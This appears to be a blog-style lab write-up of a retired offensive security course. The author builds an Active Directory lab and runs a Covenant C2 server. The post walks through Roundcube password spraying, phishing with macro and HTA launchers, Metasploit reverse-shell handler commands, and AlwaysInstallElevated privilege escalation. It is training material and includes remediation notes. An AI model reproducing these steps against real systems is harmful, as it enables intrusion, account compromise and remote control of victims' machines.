# My Journey in Server Management and Ethical Hacking

## Introduction
My journey in setting up and managing a Windows Server environment has been both challenging and rewarding. Here's a chronicle of my experiences, from installing Windows Server 2019 to exploring various functionalities like Active Directory and remote desktop setups. Join me in my journey of learning Movement, Pivoting and Persistence.

Movement, Pivoting and Persistence was a course on TCM Academy but has since been retired, this is a blog of my personal learning experience during that course. 

## Setting Up the Environment

### Installation
- **Windows Server 2019 and Workstations**: Successfully installed Windows Server 2019 (DC01) and two workstations, 01 and 02.

### Active Directory and Domain Services
- **Scripted Installation**: Utilized a script to install Windows Active Directory, domain services, and tools. This script also generated a forest for the domain controller (DC01) to sit in.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/24c5b259-551c-4b32-bc5f-4a011aa0a193)



### Domain Controller Setup
- **Initial Configuration**: Faced some initial hiccups with DNS errors and domain credentials, but managed to set up the initial domain controller effectively.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e2130f8b-2ee2-4807-9bed-0f7be1e1de77)

- **Snapshot Creation**: Created a snapshot post-forest creation as a precautionary backup.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a32c844f-f336-4c64-af28-1ffe04b36d96)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e4d11cf3-06a1-4088-a3c4-9f9538bbed05)


- **Additional Configurations**: Promoted the mayor to domain and enterprise administrator, renamed the domain controller, created groups, and added users.

### Workstations Setup
- **Network Configuration and Domain Linking**: Linked Workstation1 and 2 to DC01, modifying network adapters and confirming connectivity.

I realized here that somehow I had Windows 10 Home Edition which does not allow you to connect to a domain. But I downloaded the correct Windows 10 Enterprise version and all was well! Both workstations were eventually added.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/d751c44b-1a30-4e13-823b-46518aadddf1)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e06e05d-837e-47aa-9fec-e74cfcfc5de2)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/38993e6d-5309-43c2-a41b-617fab29ea20)

I then located the shared folder and located the nameGen script to the desktop. The nameGen script will simply allow me to rename the two workstations. I then opened up PowerShell(Admin) and moved directories. 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58c9a400-3410-4554-9f3e-d068ad728247)

From here I had to change the ExecutionPolicy to Unrestricted since this is a trusted script. 

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6d3770e1-6fb8-4d69-81d2-98ce569bc626)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/dc8c674f-f895-42ae-b1e3-b699d4580681)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/43cb6f4a-6b56-494e-b6ed-6a1efc7e5965)

## Setting up Ubuntu Mail

Here I changed the DNS address to 8.8.8.8 which is the Google DNS address. And then I had to turn "Wired" Off then On again for it to take effect.
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4f0d374c-f56a-433e-8d7d-e1650a82e353)

Opened Edge on Workstation-01 and went to our Ubuntu IP address:
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0cd9a19f-ecab-41f3-ba95-47573ad793d0)

Now it's time to Command and Control(C2)!

## How do you actually C2 though?
- Command and control platforms provide the two-way connectivity needed to interact with long-term environments under one umbrella
- Utilizing a tool such as Covenant or Metasploit, communications and instructions can be issued to multiple victim machines, and allow for native exploitation to occur.
- Both Covenant and Metasploit have native tools built in that allow for privilege escalation, changing processes, dumping hashes and more.

## Covenant
`wget https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh`
- `chmode +x dotnet-install.sh`
- `./dotnet-install.sh --channel 3.1`
- `git clone --recurse-submodules https://github.com/cobbr/Covenant`
- `cd Covenant/Covanent`
- `./dotnet/dotnet run`

I ran into a snag here where the ICU package was not installed:
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/de156c72-c511-4a3b-a123-5a9e72ba3854)

After some troubleshooting, I fixed it with this command:
`export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1`
`~/.dotnet/dotnet run (3.1)`
` dotnet run (6.0)`
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/7f45f15b-6e43-4bb3-b7d1-2e9ac8f72d75)

Now it's Grunt Time!
Grunts are Covenant's C# implant and act pretty much like any grunt would act doing your bidding and acting out tasks you assign. There are different types:
- GruntHTTP - reverse powershell launcher
- GruntSMB - Communicate over SMB, very unstable
- Brute - Best for use on linux machines (cross-platform immplant built on .NET Core 3.1)

We will opt in for Net40 here as it opens up more machines to exploit. 
5 Seconds is the fasted delay that still remains stable. 

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/80cda230-837c-4fbb-9259-e949058c2f46)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cfd3ccdd-1a50-4d1e-9f62-e54c64cbadab)

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c9ab8b99-9762-407f-8254-37c33cc37c77)
- In the above picture we are hositng a PowerShell script that we can call from other machines later on.
- The Encoded Launcher script we can launch from PowerShell.

### Covenant - Session Zero Sessions vs. Greater than Zero Sessions

SessionID
- Windows differentiates between session 0 and session 1s
  - Session 0 is highly sensitive or isolated.
  - Windows uses a process sort of like virtual machines to run what these processes are and they don't want users to be able to run system level functions coming from these sessions.
 
Session Integrity
- System 0, System 1, High, Medium, Low
- Anything hidden might be higher than our current level of session integrity which is currently medium.
- It is possible to escalate our priviledges through a UAC bypass attack, we could get into a high integrity session or an Administrative session.
- There is also "winlogon" we can figure out if we can migrate or impersonate this process which we could do through Covenant/Metasploit.
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c5c97750-5abb-494d-8a11-d1efead0eb28)

## Website Enumeration & Wordlist Generation

My exploration of the mayorsec website's "About" section revealed numerous names, perfect for potential brute force or password spraying attacks. Here's a breakdown of my process:

- **Identifying Potential Usernames**: Carefully read through the "About" section of the mayorsec website and noted all the names listed.

- **Command Line Operations**: Opened up the command prompt to start processing these names.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58d82b3c-213a-4b57-97ea-cfdb8009d5c4)


- **Generating Raw Name List**:
  - Executed `python3 namemash.py /root/Desktop/rawnames` to output a list of raw names.
  - The `rawnames` file contains the list of names I initially gathered from the website.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/58929657-37ec-4cce-9e75-b1433707c33c)


- **Creating a Username List**:
  - Now equipped with a potential list of usernames.
  - To determine the naming convention, I planned to attack the roundcube mail.

- **Generating Word List for Attack**:
  - Used `python3 namemash.py /root/Desktop/rawnames > /root/Desktop/combolist` to create a word list.
  - Navigated through directories and listed contents to ensure the word list (`combolist`) was correctly generated.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/78d45c11-fa0f-4fe4-9356-9681b762c18b)

This process was crucial in preparing for the subsequent steps of the security testing, specifically targeting the roundcube mail for further analysis.


### OWASP ZAP

My journey into security testing included the installation and use of OWASP ZAP on Kali, a free and open-source tool akin to Burp Suite Pro. Here's how I integrated and utilized it:

- **Installation and Setup**:
  - Installed OWASP ZAP on Kali Linux.
  - Required the installation of FoxyProxy on Firefox for proper functionality.

- **Configuring SSL Certificate**:
  - In ZAP, navigated to `Tools > Options > Dynamic SSL Certificate` and saved the certificate to the root.
  
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/df21e2ac-abb9-488a-bf0d-a656c741e1b7)

  - On Firefox, searched for "certificate" in preferences and viewed the certificates.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c29f902e-3343-48bb-b44d-b416101529ba)

  - Imported the ZAP certificate to Firefox for trusted website identification.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/88a4faa5-c2c7-41a5-add3-909751273aaa)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6ccfde6f-4c58-4c95-b248-0641e93aa64b)

- **Setting Up Local Proxy**:
  - Adjusted ZAP's local proxy settings from 8080 to 8081 to avoid conflicts with Burp Suite.
    
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cdeeed30-5e26-4ac9-9709-a3c7551160eb)


- **Integrating FoxyProxy with ZAP**:
  - Configured FoxyProxy on Firefox with ZAP's proxy settings (IP: 127.0.0.1, Port: 8081) and enabled it while browsing.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4543366f-360c-4cc5-89b7-f6923d7cadc9)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3cac266d-c584-49e5-9fe1-196a673afe3b)


- **Testing with UbuntuMail VM**:
  - Accessed the UbuntuMail VM via Firefox and performed cleanup tasks, retaining only the necessary components like Roundcube.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/5a583957-d33f-462e-b92c-9c15301e9d6c)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/6cae08d4-9bf2-423d-af14-2e52fdc1160e)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/50ed09c5-0742-4c53-b8ff-591490619d3c)


- **Capturing and Analyzing Requests**:
  - Tested the Roundcube service by capturing and analyzing a POST request in ZAP.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/83e2b1e6-8438-4eb7-9f3c-026abe29b5b1)

  - Can attack and do Fuzz (much like the Intruder function with Burp Suite).
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3da5a70a-a63a-4110-86af-d6ca43363a0e)

Select Username(test) - Add - Add - Select File from drop down - Select button - Desktop - Combolist
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/757d3da3-e535-4a90-87bb-985cc71c7e65)


- **Fuzz Testing**:
  - Conducted fuzz testing by adding the username "test" and the password "Summer2021!" from a pre-generated wordlist.
    
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/bf9291d4-d4a3-4c35-8d6c-b04bd74ca89f)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/76ba55ff-fe62-4cc6-aafc-49774dcab1ca)

  - Successfully gained access, demonstrating the effectiveness of combining OWASP ZAP with manual enumeration for password spraying.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/15edbdb5-01d7-469e-bb1e-eb156d71a866)

This in-depth exploration with OWASP ZAP not only enhanced my understanding of vulnerability testing but also significantly improved my practical skills in conducting security assessments.


### Outward Email Phishing With Covenant

My exploration into the world of cybersecurity included conducting an outward email phishing campaign using Covenant. Here's a detailed walkthrough of the process:

- **Setting Up a New Listener in Covenant**:
  - Initiated by creating a new listener in Covenant+.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/4e0d9fc1-adf8-40af-ae2c-797e46e77c90)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/03cf5d7f-893d-4349-9296-9697fe5c2d9a)


- **Creating a PowerShell Launcher**:
  - Progressed to creating a new PowerShell Launcher in Covenant.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/787749a0-6a22-42f6-91fc-8f4e391b04fd)

  - Configured the launcher settings:
    - Set the listener to HTTP Listener.
    - Chose DotNetVersion as Net40.
    - Ensured the KillDate was set in the future.
    - Generated the launcher.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e8de91da-b4bb-4085-a0b8-595da5f7aa51)

- **Hosting the PowerShell Script**:
  - In the Host tab, typed `/rev.ps1` and clicked the Host button.
  - Copied the EncodedLauncher script for later use.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/dd76e5e2-9fe9-4006-a764-02a5d95480f5)


- **Preparing the Phishing Document**:
  - Located the 'benefits' document and moved it to the file share.
  - Enabled content on the word document 'benefits' to activate the payload.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/c40a84e4-0945-4a59-9bb7-7b9ea2ed0633)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ec4c7c3d-96ec-40d0-8579-ca079c0ddfe8)

- **Hosting the Document on a Listener**:
  - In Covenant, clicked on the HTTP listener and went to the Hosted Files tab.
  - Created an entry "/Benefits.doc" and selected the benefits.doc file from the desktop.
  - Checked on a web browser to ensure the document was correctly hosted and downloadable.

localhost./Benefits.doc

- **Completing the Phishing Email**:
  - Embedded the hyperlink to the hosted document within a RoundCube phishing email.
  - Upon clicking the link, no immediate action occurred within the document.
  - However, a successful shell opening was observed in Covenant, indicating the effectiveness of the phishing attack.

In this exercise, I successfully merged the elements of Covenant’s powerful capabilities with tactical phishing strategies, demonstrating a critical aspect of cybersecurity operations.


## HTA Extension File or HTML Application for Phishing Emails
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ad048358-9ac7-43e4-8449-9171dcd9ad85)


### Creating HTA for Phishing
- In Covenant, under Launchers and then Powershell:
  - Selected HTTP Listener with Net40.
  - Generated the required code.
  - Pasted the generated code into the "Powershell command here" section of an HTA file, named it `benefits.hta`.
- Hosted `Benefits.hta` on the HTTP Listener and verified its accessibility through a browser.

## HTA Email Phishing with Metasploit

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f5f7fcb6-37f5-48ad-94ff-e47d76f7709e)

### Metasploit Configuration
- On Metasploit, executed the following commands:
  - `use exploit/multi/handler`
  - `set payload windows/x64/meterpreter/reverse_tcp`
  - `set lhost eth0`
  - `set lport 443`
  - `exploit -j`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/0e4009ec-269b-4adc-9535-9e578cc92f2d)

- After running `sessions -K`, initiated `exploit -j`.
- On Kali, started a simple HTTP server using `python3 -m http.server 80`.
- On a Windows machine, checked the email and clicked the link from the phishing email.
- On Metasploit, observed the opening of a new meterpreter session.

### Meterpreter Session Handling
- Used `sessions` to see the new meterpreter session.
- Interacted with the session using `sessions -i 2` and checked user ID with `getuid`.

## Reports

### Password Spraying Finding
- **Description**: ABC Org's Roundcube E-Mail service had poor password policies, leading to account compromise via password spraying.
- **Remediation**: Suggested the implementation of strong password policies for the Roundcube E-Mail server, aligning with industry best practices.

### Email Phishing Finding
- **Description**: ABC Org experienced compromise of user workstations in the MayorSec domain due to successful email phishing, bypassing antivirus restrictions.
- **Remediation**: Recommended bi-annual training on identifying suspicious emails and attachments, along with implementing a Group Policy Object to prevent local users from disabling antivirus software.

## Local Enumeration with Covenant

- Accessed Covenant's local enumeration features at `localhost:7443/grunt`.
- Utilized `Seatbelt -group=all` for detailed information, though the process was heavy and slow.
- Gathered significant data on potential target processes and strategies to bypass antivirus mechanisms using `GetNetLocalGroup`.


# Local Enumeration with Metasploit

The process of local enumeration with Metasploit involved several steps, primarily centered around gathering network information and understanding the system's internal workings.

### Starting Metasploit and Creating a Reverse Shell
- Initiated Metasploit in Kali using the command `msfconsole`.
- Created a reverse shell and interacted with the session:
`msf6 exploit(multi/script/web_delivery) > sessions`
`msf6 exploit(multi/script/web_delivery) >sessions -i 5`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/968f41c9-00cd-4c13-85fd-a9cf57069087)

### Network Information Gathering
- Used various meterpreter commands to gather network information:
`meterpreter > ipconfig`
	- shows IP addresses of Interfaces
`meterpreter > arp`
	- see devices running on network 
`meterpreter > netstat -ano`
	-  lots are for VMs
`meterpreter > run post/windows/gather/enum_services`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b65bff33-b45a-43d1-b458-256bb96753e8)

`meterpreter > run post/windows/gather/enum_applications`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/ce03caab-cdfe-4cbd-9a12-e8962a4d2daf)

# AutoLogon Misconfiguration and Exploitation

Exploring the AutoLogon feature in Windows, I demonstrated how misconfiguration can lead to security vulnerabilities, allowing user accounts to bypass the login screen using hardcoded credentials.

### Configuring AutoLogon in Windows
- Accessed the Registry Editor on Workstation 01 and navigated to the relevant keys:
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version

- Modified the `AutoAdminLogon` key and added new values for domain name, username, and password.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/b9be6dde-6703-45f6-bb19-8f28bdfcf092)

### PowerShell and Credential Enumeration
- Opened PowerShell and imported the code generated from Covenant's launcher.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e97bd1da-f410-4970-99d9-42fc203bf0b4)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/8eeda8ad-59bb-4454-b4b7-ffbd5446ffba)


- Ran the `PowerUp.ps1` script to gather information about privilege escalation opportunities.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a0b04efa-2a8f-49f7-997f-861749aaaf7f)

- Identified that the account is in the administrative group, suitable for a UAC attack.

- Searched the registry for hardcoded credentials using SharpUp and Seatbelt tools:
- 
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/57354a84-edc0-4a36-8525-fb53dc0e3283)

This process highlighted the importance of proper configuration and the potential risks of hardcoded credentials in the system's registry.

# AlwaysInstallElevated

The AlwaysInstallElevated registry setting is a critical component for privilege escalation in lab environments and Capture The Flag (CTF) challenges. By configuring this, installation packages are installed with system privileges, which can be exploited for privilege escalation.

### Configuring Registry for AlwaysInstallElevated
- Accessed the Registry Editor and navigated to `HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Installer`.
- Changed the value from 0 to 1.
- Navigated to `HKEY_CURRENT_USER > Software > Policies > Microsoft`.
  - Created a new key named "Installer".
  - Inside the Installer key, added a new DWORD 32-bit value named "AlwaysInstallElevated" and changed its value from 0 to 1.

### Exploitation Process in Kali
- Generated a new PowerShell launcher in Kali.
- Used SharpUp to audit for privilege escalation opportunities, specifically looking for "HKLM" and "HKCU" under the "AlwaysInstallElevated Registry Keys".

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f0920219-ec6a-4906-a0b3-44a21a45b61b)

- Also performed enumeration using PowerShell:
  - Typed `PowerShellImport` in the blue screen interface, browsed for the "PowerUp.ps1" file, and executed it.
  - Ran `Powershell invoke-allchecks` to check for other privilege escalation opportunities.

### Creating and Executing Malicious Installer
- Utilized Msfvenom to create a new payload for a reverse shell.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/92f3362a-9f3d-4f64-9ae3-ace4ca296626)

- Grabbed the reverse shell code from Covenant and integrated it into the payload creation process.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/92e80c08-792a-41cb-a39b-8422895a9121)


- Checked the results of the "Powershell invoke-allchecks" command for additional insights.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/3afe62b7-4d77-47fd-a252-db9893c60867)

- Generated a new administrative user on the machine using the information obtained.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/1bf6dd7c-7087-4ae0-8af2-2d8cfa79ab7b)

- Verified the installation of the malicious installer:

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/e7557be8-9022-4ce9-ab69-2dec58d79b60)

- Executed the malicious installer to obtain a reverse shell and an elevated callback as the system user.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/cac76fe1-1e46-42d6-880b-0ef133a1592f)
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/15e1d4b8-b20e-4725-83b3-fa679c72ee6f)


This process demonstrated how the AlwaysInstallElevated setting could be exploited to gain elevated privileges on a target system.














## Privilege Escalation and Security Testing

### Windows Server 2019 - Privilege Escalation
- **Using Covenant with Metasploit**: Successfully conducted a User Account Control (UAC) bypass attack on Windows Server 2019. This complex process involved leveraging Covenant integrated with Metasploit for effective privilege escalation.

  ![UAC Bypass Using Covenant](Pasted image link here)

### Vulnerability Assessment on UbuntuMail VM
- **OWASP ZAP Usage**: Employed OWASP ZAP, a powerful security testing tool, to identify and analyze vulnerabilities in the UbuntuMail VM. The process included setting up and configuring the tool, followed by thorough testing and result analysis.

  ![OWASP ZAP Analysis](Pasted image link here)

### Key Learnings and Outcomes
- **Developed Deep Understanding**: Gained a profound understanding of Active Directory's intricacies, the nuances of privilege escalation, and vulnerability assessment.
- **Hands-On Experience**: Acquired practical experience in using advanced security tools and techniques in a controlled environment.
- **Problem-Solving Skills**: Honed problem-solving skills, especially in troubleshooting and overcoming various setup and configuration challenges.

## Conclusion
This journey through setting up Windows Server 2019, implementing Active Directory, conducting privilege escalation, and performing vulnerability assessment using OWASP ZAP has been an enriching experience. It not only augmented my technical skills but also strengthened my problem-solving abilities and attention to detail in the field of cybersecurity.


